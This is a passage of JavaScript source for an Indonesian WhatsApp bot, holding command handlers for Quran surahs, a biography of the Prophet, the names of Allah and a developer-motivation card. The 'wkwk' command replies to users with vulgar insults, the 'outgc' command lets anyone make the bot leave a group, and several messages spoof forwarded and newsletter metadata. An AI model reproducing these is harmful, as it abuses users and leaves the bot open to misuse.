case 'wkwk': {
 const yapping = [
 `kalo ga niat ketawa, gausah ketawa ngentot\nAnjing tolol yapping doang`,
 `wkwk tai lu kontol\nBocah bodoh diem aja kalo gak lucu`,
 `ngentot memek, ketawa gitu doang bangga\nBego amat sih lu`,
 `kalo mau yapping sana ke grup bocil\nAnjing gak guna`
 ];
 const random = yapping[Math.floor(Math.random() * yapping.length)];
 return payreply(random);
}
break;

case "outgc": {
 let groupId = m.chat

 // Kalau ada argumen, pakai ID grup dari argumen
 if (args[0]) {
 groupId = args[0].includes("@g.us")? args[0] : args[0] + "@g.us"
 }

 // Cek bot ada di grup itu gak
 let metadata
 try {
 metadata = await Asepp.groupMetadata(groupId)
 } catch {
 return Asepp.sendMessage(m.chat, {
 text: "❌ *Grup gak ketemu beb*\nPastiin ID grup bener atau bot ada di grup itu"
 }, { quoted: m })
 }

 try {
 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 await Asepp.groupLeave(groupId)

 await Asepp.sendMessage(m.chat, {
 text: `✅ *Berhasil keluar dari grup*\n\n` +
 `📛 Nama: ${metadata.subject}\n` +
 `_Dadah beb, see you_`
 }, { quoted: m })

 await Asepp.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

 } catch (err) {
 console.error("OutGC Error:", err)
 await Asepp.sendMessage(m.chat, {
 text: "❌ *Gagal keluar grup beb*\n_Mungkin bot udah gak ada di grup itu_"
 }, { quoted: m })
 await Asepp.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
 }
}
break

case "gnticmd": {
 if (!isCreator) return payreply(mess.owner)
 if (!text.includes('|')) {
 return payreply(
 `Usage: ${prefix}gnticmd <old> | <new>\n` +
 `Ex: ${prefix}gnticmd menu | start`
 )
 }

 const fs = require("fs")
 let [oldCmd, newCmd] = text.split('|').map(v => v.trim())
 const file = "./AseppLohya.js"
 
 try {
 if (!fs.existsSync(file)) {
 return payreply(`[ERR] File ${file} not found`)
 }

 let data = fs.readFileSync(file, "utf8")
 let re = new RegExp(`case\\s+["']${oldCmd}["']\\s*:`, 'i')
 
 if (!re.test(data)) {
 return payreply(`[ERR] case "${oldCmd}" not found`)
 }

 let out = data.replace(re, `case "${newCmd}":`)
 fs.writeFileSync(file, out, "utf8")

 return payreply(
 `┌─ gnticmd\n` +
 `│ Updated: ${oldCmd} → ${newCmd}\n` +
 `│ File: ${file}\n` +
 `└─ Status: OK\n` +
 `Restart bot, then tell buyer to run .autoupdate`
 )

 } catch (e) {
 return payreply(`[ERR] ${e.message}`)
 }
}
break

case 'alasr': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗔𝗦𝗥\`
Surat ke-103 | 3 ayat | Makkiyah | Masa

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
وَالْعَصْرِ
إِنَّ الْإِنسَانَ لَفِي خُسْرٍ
إِلَّا الَّذِينَ آمَنُوا وَعَمِلُوا الصَّالِحَاتِ وَتَوَاصَوْا بِالْحَقِّ وَتَوَاصَوْا بِالصَّبْرِ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Demi masa.
2. Sesungguhnya manusia itu benar-benar dalam kerugian,
3. kecuali orang-orang yang beriman dan mengerjakan amal saleh dan saling menasihati supaya menaati kebenaran dan saling menasihati supaya menetapi kesabaran.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'almaun': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗠𝗔'𝗨𝗡\`
Surat ke-107 | 7 ayat | Makkiyah | Barang yang Berguna

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
أَرَأَيْتَ الَّذِي يُكَذِّبُ بِالدِّينِ
فَذَٰلِكَ الَّذِي يَدُعُّ الْيَتِيمَ
وَلَا يَحُضُّ عَلَىٰ طَعَامِ الْمِسْكِينِ
فَوَيْلٌ لِّلْمُصَلِّينَ
الَّذِينَ هُمْ عَن صَلَاتِهِمْ سَاهُونَ
الَّذِينَ هُمْ يُرَاءُونَ
وَيَمْنَعُونَ الْمَاعُونَ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Tahukah kamu orang yang mendustakan agama?
2. Itulah orang yang menghardik anak yatim,
3. dan tidak menganjurkan memberi makan orang miskin.
4. Maka celakalah bagi orang-orang yang shalat,
5. yaitu orang-orang yang lalai dari shalatnya,
6. orang-orang yang berbuat riya,
7. dan enggan menolong dengan barang berguna.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'alquraish': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗤𝗨𝗥𝗔𝗜𝗦𝗛\`
Surat ke-106 | 4 ayat | Makkiyah | Suku Quraisy

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
لِإِيلَافِ قُرَيْشٍ
إِيلَافِهِمْ رِحْلَةَ الشِّتَاءِ وَالصَّيْفِ
فَلْيَعْبُدُوا رَبَّ هَٰذَا الْبَيْتِ
الَّذِي أَطْعَمَهُم مِّن جُوعٍ وَآمَنَهُم مِّنْ خَوْفٍ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Karena kebiasaan orang-orang Quraisy,
2. kebiasaan mereka bepergian pada musim dingin dan musim panas.
3. Maka hendaklah mereka menyembah Tuhan Pemilik rumah ini,
4. Yang telah memberi makanan kepada mereka untuk menghilangkan lapar dan mengamankan mereka dari ketakutan.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'alfil': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗙𝗜𝗟\`
Surat ke-105 | 5 ayat | Makkiyah | Gajah

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
أَلَمْ تَرَ كَيْفَ فَعَلَ رَبُّكَ بِأَصْحَابِ الْفِيلِ
أَلَمْ يَجْعَلْ كَيْدَهُمْ فِي تَضْلِيلٍ
وَأَرْسَلَ عَلَيْهِمْ طَيْرًا أَبَابِيلَ
تَرْمِيهِم بِحِجَارَةٍ مِّن سِجِّيلٍ
فَجَعَلَهُمْ كَعَصْفٍ مَّأْكُولٍ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Apakah kamu tidak memperhatikan bagaimana Tuhanmu telah bertindak terhadap pasukan bergajah?
2. Bukankah Dia telah menjadikan tipu daya mereka itu sia-sia?
3. Dan Dia mengirimkan kepada mereka burung yang berbondong-bondong,
4. yang melempari mereka dengan batu dari tanah yang terbakar,
5. lalu Dia menjadikan mereka seperti daun-daun yang dimakan ulat.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'motivasidev':
case 'devtips':
case 'motivation': {
 await Asepp.sendMessage(m.chat, { react: { text: "🔥", key: m.key } })

 let teks = `\`𝗗𝗘𝗩 𝗠𝗢𝗧𝗜𝗩𝗔𝗧𝗜𝗢𝗡\`

Hi \`${pushname}\` 👋 Buat lu yang lagi ngulik SC dan mulai ngerasa capek sama drama.

⌲ \`𝐏𝐎𝐈𝐍 𝐔𝐓𝐀𝐌𝐀\`
┏━━━━━━━━
┃✦ Fokus ke produk, bukan drama
┃✦ Simple tapi stabil > mewah tapi bug
┃✦ Bangun nama dari konsistensi
┃✦ Jangan malu pakai AI buat bantu ngoding
┃✦ Ada yang nyenggol? Di diemin aja
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐒𝐀𝐍\`
Jadilah dev yang pakai base simple tapi fungsinya jalan. 
Tiru cara mereka bikin produk yang berguna, tiru teknik marketingnya, 
tapi jangan tiru cara merugikan orang lain.

Nama besar itu dibangun dari konsistensi, bukan dari drama. 
Kalau SC lu bocor atau kena crack, terima aja. Kasih pelajaran, blacklist, lanjut kerja.

Yang memalukan itu udah paham ilmunya tapi gak punya sopan santun.
Kita itu perintis, bukan pewaris. Stay cool, lanjut ngoding.
┏━━━━━━━━━━
┃ ✍️ *Motivasi by: Asep Xyz*
┃ 💻 *Tukang Motivasi di Balik Kode*
┗━━━━━━━━━━
\`[🔥] 𝐒𝐓𝐀𝐘 𝐂𝐎𝐎𝐋 [🔥]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://qu.ax/fPcSi" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐃𝐄𝐕 𝐌𝐎𝐓𝐈𝐕𝐀𝐓𝐈𝐎𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐃𝐄𝐕 𝐓𝐈𝐏𝐒",
 url: `https://github.com/AsepXyz12/bot-wa-db`,
 copy_code: "STAY COOL",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1],
 list_title: "CLICK",
 button_title: "© MOTIVATION"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© MOTIVATION",
 sections: [{
 title: "Dev Motivation",
 highlight_label: "𝐌𝐈𝐍𝐃𝐒𝐄𝐓 🚀",
 rows: [
 { title: "𝐅𝐨𝐤𝐮𝐬 𝐏𝐫𝐨𝐝𝐮𝐤", description: "𝐁𝐮𝐚𝐭 𝐲𝐚𝐧𝐠 𝐛𝐞𝐫𝐠𝐮𝐧𝐚, 𝐛𝐮𝐤𝐚𝐧 𝐜𝐮𝐦𝐚 𝐠𝐚𝐧𝐭𝐞𝐧𝐠", id: `${prefix}motivasidev` },
 { title: "𝐒𝐭𝐚𝐲 𝐂𝐨𝐥", description: "𝐉𝐚𝐧𝐠𝐚𝐧 𝐤𝐞𝐛𝐚𝐰𝐚 𝐝𝐫𝐚𝐦𝐚", id: `${prefix}motivasidev` },
 { title: "𝐋𝐞𝐚𝐫𝐧 𝐌𝐨𝐫𝐞", description: "𝐁𝐞𝐥𝐚𝐣𝐚𝐫 𝐭𝐞𝐧𝐚𝐧𝐠 𝐝𝐚𝐧 𝐤𝐨𝐧𝐬𝐢𝐬𝐭𝐞𝐧", id: `${prefix}motivasidev` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/3021.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'nabi':
case 'rasulullah':
case 'sirah':
case 'sholawat': {
 await Asepp.sendMessage(m.chat, { react: { text: "ﷺ", key: m.key } })

 let teks = `\`𝗦𝗘𝗟𝗨𝗥𝗨𝗛 𝗧𝗘𝗡𝗧𝗔𝗡𝗚 𝗡𝗔𝗕𝗜 𝗠𝗨𝗛𝗔𝗠𝗔𝗗 ﷺ\`

Assalamualaikum \`${pushname}\` 👋 Ini rangkuman lengkap tentang baginda Rasulullah ﷺ. Baca pelan-pelan dan amalkan sunnahnya.

⌲ \`𝐍𝐀𝐒𝐀𝐁 & 𝐊𝐄𝐋𝐀𝐇𝐈𝐑𝐀𝐍\`
┏━━━━━━━━
┃1. *Nama Lengkap* - Muhammad bin Abdullah bin Abdul Muthalib bin Hasyim Al-Qurasyi
┃2. *Lahir* - 12 Rabiul Awwal Tahun Gajah, 571M di Makkah
┃3. *Gelar* - Al-Amin, As-Shadiq. Belum pernah berdusta walau sekali
┃4. *Masa Kecil* - Yatim, digembala kambing, ikut paman berdagang ke Syam
┃5. *Pernikahan* - Menikah dengan Khadijah RA usia 25 tahun
┗━━━━━━━━━━
⌲ \`𝐍𝐔𝐁𝐔𝐖𝐀𝐇 & 𝐃𝐀𝐊𝐖𝐀𝐇\`
┏━━━━━━━━
┃1. *Wahyu Pertama* - Usia 40 tahun di Gua Hira, QS. Al-Alaq 1-5
┃2. *Dakwah Sirr* - 3 tahun sembunyi-sembunyi di Makkah
┃3. *Dakwah Jahriyah* - Terbuka, disiksa Quraisy, diboikot 3 tahun di Syi'b Abi Thalib
┃4. *Isra Mi'raj* - Diperjalankan malam ke Masjidil Aqsa lalu ke Sidratul Muntaha
┃5. *Hijrah* - 622M ke Madinah. Bangun masjid, pasar, persaudaraan Muhajirin Anshar
┃6. *Piagam Madinah* - Konstitusi pertama yang menyatukan semua golongan
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐑𝐀𝐍𝐆 & 𝐏𝐄𝐑𝐉𝐀𝐍𝐉𝐈𝐀𝐍 𝐏𝐄𝐍𝐓𝐈𝐍𝐆\`
┏━━━━━━━━
┃1. *Badr* - 2H, 313 vs 1000. Kemenangan pertama kaum muslimin
┃2. *Uhud* - 3H, pelajaran tentang taat perintah Nabi
┃3. *Khandaq/Ahzab* - 5H, strategi parit dari Salman Al-Farisi
┃4. *Hudaibiyah* - 6H, perjanjian damai 10 tahun
┃5. *Fathu Makkah* - 8H, Makkah ditaklukkan tanpa pertumpahan darah besar
┃6. *Haji Wada'* - 10H, khutbah terakhir di Arafah
┗━━━━━━━━━━
⌲ \`𝐒𝐔𝐍𝐀𝐇 𝐖𝐀𝐉𝐈𝐁 / 𝐌𝐔𝐀𝐊𝐀𝐃\`
Wajib diikuti, dosa jika ditinggalkan tanpa udzur:
┏━━━━━━━━
┃1. Sholat 5 waktu berjamaah bagi laki-laki
┃2. Sholat Jumat
┃3. Sholat Witir
┃4. Sholat Idul Fitri & Idul Adha
┃5. Qurban bagi yang mampu
┃6. Aqiqah untuk anak
┃7. Menutup aurat sesuai syariat
┗━━━━━━━━━━
⌲ \`𝐒𝐔𝐍𝐀𝐇 𝐑𝐔𝐓𝐈𝐍 𝐒𝐄𝐇𝐀𝐑𝐈-𝐇𝐀𝐑𝐈\`
┏━━━━━━━━
┃1. *Sholat Sunnah* - Rawatib 12 rakaat, Dhuha 2-8 rakaat, Tahajjud, Witir
┃2. *Puasa Sunnah* - Senin Kamis, Ayyamul Bidh 13-15 Hijriyah, Daud
┃3. *Dzikir & Doa* - Pagi petang, setelah sholat, sebelum tidur, masuk keluar rumah
┃4. *Adab Harian* - Bersiwak, makan pakai tangan kanan, baca bismillah, tidur miring kanan
┃5. *Akhlak Sosial* - Senyum, memberi salam, membantu orang, jenguk orang sakit
┃6. *Baca Al-Quran* - Minimal 1 halaman sehari
┗━━━━━━━━━━
⌲ \`𝐀𝐊𝐇𝐋𝐀𝐊 & 𝐌𝐔𝐀𝐌𝐀𝐋𝐀𝐇 𝐍𝐀𝐁𝐈 ﷺ\`
┏━━━━━━━━
┃1. *Shidiq* - Selalu jujur
┃2. *Amanah* - Dipercaya semua orang, bahkan musuh
┃3. *Tabligh* - Menyampaikan wahyu tanpa disembunyikan
┃4. *Fathanah* - Cerdas, bijak mengambil keputusan
┃5. *Rahmah* - Penyayang ke manusia, hewan, anak kecil
┃6. *Tawadhu* - Rendah hati, mau makan bersama budak
┃7. *Sabar* - Sabar 13 tahun di Makkah, sabar di Thaif dilempari batu
┗━━━━━━━━━━
⌲ \`𝐇𝐀𝐊 𝐑𝐀𝐒𝐔𝐋𝐔𝐋𝐀𝐇 ﷺ 𝐀𝐓𝐀𝐒 𝐔𝐌𝐀𝐓\`
┏━━━━━━━━
┃1. *Mencintai beliau lebih dari diri sendiri* - HR. Bukhari Muslim
┃2. *Mengikuti sunnahnya* - "Ikutilah aku jika kamu mencintai Allah" QS. Ali Imran 31
┃3. *Membela kehormatan beliau* - Dari celaan dan penghinaan
┃4. *Memperbanyak sholawat* - Allah dan malaikat bersholawat untuk beliau QS. Al-Ahzab 56
┃5. *Tidak mendahulukan pendapat atas sunnahnya*
┃6. *Menghidupkan sunnah yang ditinggalkan manusia*
┗━━━━━━━━━━
⌲ \`𝐀𝐃𝐀𝐁 𝐊𝐄𝐏𝐀𝐃𝐀 𝐍𝐀𝐁𝐈 ﷺ\`
┏━━━━━━━━
┃1. Bersholawat setiap disebut namanya
┃2. Tidak meninggikan suara di hadapan beliau
┃3. Mempelajari sirah dan sunnahnya
┃4. Menghormati keluarga dan sahabat beliau
┃5. Tidak membuat gambar beliau
┃6. Menziarahi makam beliau jika mampu
┗━━━━━━━━━━
⌲ \`𝐊𝐄𝐋𝐔𝐀𝐑𝐆𝐀 & 𝐒𝐀𝐇𝐀𝐁𝐀𝐓 𝐃𝐄𝐊𝐀𝐓\`
┏━━━━━━━━
┃*Istri* - Khadijah, Aisyah, Hafshah, Zainab, Ummu Salamah, dll. 11 istri
┃*Anak* - Qasim, Abdullah, Ibrahim, Zainab, Ruqayyah, Ummu Kultsum, Fatimah
┃*Khulafa Rasyidin* - Abu Bakar, Umar, Utsman, Ali RA
┃*Sahabat 10 Dijamin Surga* - Abu Bakar, Umar, Utsman, Ali, Thalhah, Zubair, Abdurrahman bin Auf, Sa'ad, Sa'id, Abu Ubaidah RA
┗━━━━━━━━━━
⌲ \`𝐖𝐀𝐅𝐀𝐓 & 𝐏𝐄𝐍𝐈𝐍𝐆𝐀𝐋𝐀𝐍\`
┏━━━━━━━━
┃1. *Wafat* - 12 Rabiul Awwal 11H, usia 63 tahun di Madinah
┃2. *Makam* - Dimakamkan di kamar Aisyah RA, sekarang Raudhah Masjid Nabawi
┃3. *Peninggalan* - Al-Quran, Sunnah, para sahabat, umat Islam yang terus berkembang
┃4. *Wasia*t - "Aku tinggalkan dua perkara, Al-Quran dan Sunnahku"
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐍𝐔𝐓𝐔𝐏 & 𝐀𝐉𝐀𝐊𝐀𝐍\`
Nabi ﷺ bersabda: 
"Barangsiapa menghidupkan sunnahku, maka ia mencintaiku. 
Dan barangsiapa mencintaiku, ia bersamaku di surga." HR. Tirmidzi

Mulai dari yang kecil: sholawat, sholat sunnah, dzikir pagi petang.
Konsisten lebih baik dari banyak tapi putus.

Semoga Allah kumpulkan kita bersama Rasulullah ﷺ di surga Firdaus.
\`[ﷺ] 𝐀𝐋𝐀𝐇𝐔𝐌𝐀 𝐒𝐇𝐎𝐋𝐈 '𝐀𝐋𝐀 𝐌𝐔𝐇𝐀𝐌𝐀𝐃 [ﷺ]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐒𝐈𝐑𝐀𝐇 𝐍𝐀𝐁𝐀𝐖𝐈𝐘𝐀𝐇',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐒𝐇𝐎𝐋𝐔 '𝐀𝐋𝐀 𝐍𝐀𝐁𝐈",
 url: `https://quran.com`,
 copy_code: "ALLAHUMMA SHOLLI",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4, 5, 6, 7, 8],
 list_title: "CLICK",
 button_title: "© SIRAH NABI"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© SIRAH NABI",
 sections: [{
 title: "Bab Tentang Rasulullah ﷺ",
 highlight_label: "𝐁𝐄𝐋𝐀𝐉𝐀𝐑 𝐒𝐈𝐑𝐀𝐇 🚀",
 rows: [
 { title: "𝐍𝐚𝐬𝐚𝐛 & 𝐊𝐞𝐥𝐚𝐡𝐢𝐫𝐚𝐧", description: "𝐒𝐢𝐚𝐩𝐚 𝐛𝐞𝐥𝐢𝐚𝐮 𝐝𝐚𝐧 𝐚𝐬𝐚𝐥 𝐮𝐬𝐮𝐥", id: `${prefix}nabi` },
 { title: "𝐍𝐮𝐛𝐮𝐰𝐚𝐡 & 𝐃𝐚𝐤𝐰𝐚𝐡", description: "𝐏𝐞𝐫𝐣𝐚𝐥𝐚𝐧𝐚𝐧 𝐝𝐚𝐤𝐰𝐚𝐡 23 𝐭𝐚𝐡𝐮𝐧", id: `${prefix}nabi` },
 { title: "𝐏𝐞𝐫𝐚𝐧𝐠 & 𝐏𝐞𝐫𝐣𝐚𝐧𝐣𝐢𝐚𝐧", description: "𝐁𝐚𝐝𝐫, 𝐔𝐡𝐮𝐝, 𝐅𝐚𝐭𝐡𝐮 𝐌𝐚𝐤𝐚𝐡", id: `${prefix}nabi` },
 { title: "𝐒𝐮𝐧𝐚𝐡 𝐖𝐚𝐣𝐢𝐛 & 𝐒𝐮𝐧𝐚𝐡", description: "𝐀𝐦𝐚𝐥𝐚𝐧 𝐲𝐚𝐧𝐠 𝐝𝐢𝐚𝐧𝐣𝐮𝐫𝐤𝐚𝐧", id: `${prefix}nabi` },
 { title: "𝐀𝐤𝐡𝐥𝐚𝐤 𝐍𝐚𝐛𝐢", description: "𝐒𝐢𝐟𝐚𝐭 𝐦𝐮𝐥𝐢𝐚 𝐛𝐞𝐥𝐢𝐚𝐮", id: `${prefix}nabi` },
 { title: "𝐇𝐚𝐤 𝐑𝐚𝐬𝐮𝐥 𝐚𝐭𝐚𝐬 𝐔𝐦𝐚𝐭", description: "𝐊𝐞𝐰𝐚𝐣𝐢𝐛𝐚𝐧 𝐤𝐢𝐭𝐚 𝐤𝐞𝐩𝐚𝐝𝐚 𝐛𝐞𝐥𝐢𝐚𝐮", id: `${prefix}nabi` },
 { title: "𝐀𝐝𝐚𝐛 𝐤𝐞𝐩𝐚𝐝𝐚 𝐍𝐚𝐛𝐢", description: "𝐂𝐚𝐫𝐚 𝐛𝐞𝐫𝐚𝐝𝐚𝐛 𝐤𝐞𝐩𝐚𝐝𝐚 𝐛𝐞𝐥𝐢𝐚𝐮", id: `${prefix}nabi` },
 { title: "𝐊𝐞𝐥𝐮𝐚𝐫𝐠𝐚 & 𝐒𝐚𝐡𝐚𝐛𝐚𝐭", description: "𝐀𝐡𝐥𝐮𝐥 𝐛𝐚𝐢𝐭 𝐝𝐚𝐧 𝐬𝐚𝐡𝐚𝐛𝐚𝐭 𝐝𝐞𝐤𝐚𝐭", id: `${prefix}nabi` },
 { title: "𝐖𝐚𝐟𝐚𝐭 & 𝐏𝐞𝐧𝐢𝐧𝐠𝐚𝐥𝐚𝐧", description: "𝐀𝐤𝐡𝐢𝐫 𝐡𝐚𝐲𝐚𝐭 𝐝𝐚𝐧 𝐰𝐚𝐬𝐢𝐚𝐭", id: `${prefix}nabi` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'allah':
case 'asmaulhusna':
case 'tauhid': {
 await Asepp.sendMessage(m.chat, { react: { text: "☝️", key: m.key } })

 let teks = `\`𝗦𝗘𝗠𝗨𝗔 𝗧𝗘𝗡𝗧𝗔𝗡𝗚 𝗔𝗟𝗔𝗛 ﷻ\`

Assalamualaikum \`${pushname}\` 👋 Ini rangkuman lengkap tentang Allah ﷻ, Tuhan semesta alam. Baca pelan-pelan dan tadabburi.

⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐑𝐔𝐁𝐔𝐁𝐈𝐘𝐀𝐇\`
Meyakini Allah satu-satunya Pencipta, Pemilik, Pengatur, Pemberi rezeki.
┏━━━━━━━━
┃1. Allah yang menciptakan langit, bumi, manusia, hewan, tumbuhan
┃2. Allah yang mengatur rezeki, jodoh, ajal, hidup mati
┃3. Tidak ada sekutu bagi-Nya dalam penciptaan dan pengaturan
┃4. Dalil: "Allah Pencipta segala sesuatu" QS. Az-Zumar 62
┗━━━━━━━━━━
⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐔𝐋𝐔𝐇𝐈𝐘𝐀𝐇\`
Hanya Allah yang berhak disembah, tidak ada yang berhak disembah selain Dia.
┏━━━━━━━━
┃1. Sholat, puasa, zakat, doa, nadzar hanya untuk Allah
┃2. Tidak boleh berdoa ke kuburan, wali, jin, benda
┃3. Lailahaillallah maknanya: tidak ada ilah yang berhak disembah kecuali Allah
┃4. Dalil: "Sembahlah Allah dan jangan sekutukan Dia dengan sesuatu pun" QS. An-Nisa 36
┗━━━━━━━━━━
⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐀𝐒𝐌𝐀 𝐖𝐀 𝐒𝐈𝐅𝐀𝐓\`
Menetapkan nama dan sifat Allah sesuai Al-Quran dan Sunnah tanpa tahrif, ta'til, takyif, tamtsil.
┏━━━━━━━━
┃1. Allah Maha Melihat, Maha Mendengar, Maha Mengetahui tanpa menyerupai makhluk
┃2. Allah bersemayam di atas Arsy sesuai keagungan-Nya
┃3. Tidak boleh mengatakan "Allah tidak punya tangan" atau "tangan Allah seperti tangan manusia"
┃4. Dalil: "Tidak ada sesuatu pun yang serupa dengan Dia" QS. Asy-Syura 11
┗━━━━━━━━━━
⌲ \`𝐀𝐒𝐌𝐀𝐔𝐋 𝐇𝐔𝐒𝐍𝐀 99 𝐍𝐀𝐌𝐀 𝐀𝐋𝐀𝐇\`
Nabi ﷺ bersabda: "Sesungguhnya Allah memiliki 99 nama, barangsiapa menghafalnya masuk surga." HR. Bukhari Muslim

┏━━━━━━━━
┃1. Ar-Rahman - Maha Pemurah
┃2. Ar-Rahim - Maha Penyayang
┃3. Al-Malik - Maha Merajai
┃4. Al-Quddus - Maha Suci
┃5. As-Salam - Maha Pemberi Keselamatan
┃6. Al-Mu'min - Maha Pemberi Keamanan
┃7. Al-Muhaimin - Maha Pengawas
┃8. Al-Aziz - Maha Perkasa
┃9. Al-Jabbar - Maha Kuasa
┃10. Al-Mutakabbir - Maha Megah
┃11. Al-Khaliq - Maha Pencipta
┃12. Al-Bari' - Maha Mengadakan
┃13. Al-Mushawwir - Maha Membentuk Rupa
┃14. Al-Ghaffar - Maha Pengampun
┃15. Al-Qahhar - Maha Memaksa
┃16. Al-Wahhab - Maha Pemberi Karunia
┃17. Ar-Razzaq - Maha Pemberi Rezeki
┃18. Al-Fattah - Maha Pembuka
┃19. Al-Alim - Maha Mengetahui
┃20. Al-Qabidh - Maha Menyempitkan
┃21. Al-Basith - Maha Melapangkan
┃22. Al-Khafidh - Maha Merendahkan
┃23. Ar-Rafi' - Maha Meninggikan
┃24. Al-Mu'izz - Maha Memuliakan
┃25. Al-Mudzil - Maha Menghinakan
┃26. As-Sami' - Maha Mendengar
┃27. Al-Bashir - Maha Melihat
┃28. Al-Hakam - Maha Menetapkan Hukum
┃29. Al-Adl - Maha Adil
┃30. Al-Lathif - Maha Lembut
┃31. Al-Khabir - Maha Mengetahui Rahasia
┃32. Al-Halim - Maha Penyantun
┃33. Al-Azim - Maha Agung
┃34. Al-Ghafur - Maha Pengampun
┃35. Asy-Syakur - Maha Pembalas Budi
┃36. Al-Ali - Maha Tinggi
┃37. Al-Kabir - Maha Besar
┃38. Al-Hafizh - Maha Memelihara
┃39. Al-Muqit - Maha Pemberi Kecukupan
┃40. Al-Hasib - Maha Membuat Perhitungan
┃41. Al-Jalil - Maha Luhur
┃42. Al-Karim - Maha Pemurah
┃43. Ar-Raqib - Maha Mengawasi
┃44. Al-Mujib - Maha Mengabulkan
┃45. Al-Wasi' - Maha Luas
┃46. Al-Hakim - Maha Bijaksana
┃47. Al-Wadud - Maha Pengasih
┃48. Al-Majid - Maha Mulia
┃49. Al-Ba'its - Maha Membangkitkan
┃50. Asy-Syahid - Maha Menyaksikan
